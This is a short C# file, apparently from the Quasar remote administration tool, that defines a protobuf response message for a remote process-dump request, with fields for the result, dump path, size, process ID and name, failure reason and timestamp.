using ProtoBuf;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages.Administration.TaskManager
{
    [ProtoContract]
    public class DoProcessDumpResponse : IMessage
    {
        [ProtoMember(1)]
        public bool Result { get; set; }

        [ProtoMember(2)]
        public string DumpPath { get; set; }

        [ProtoMember(3)]
        public long Length { get; set; }

        [ProtoMember(4)]
        public int Pid { get; set; }

        [ProtoMember(5)]
        public string ProcessName { get; set; }

        [ProtoMember(6)]
        public string FailureReason { get; set; }

        [ProtoMember(7)]
        public long UnixTime { get; set; }
    }
}
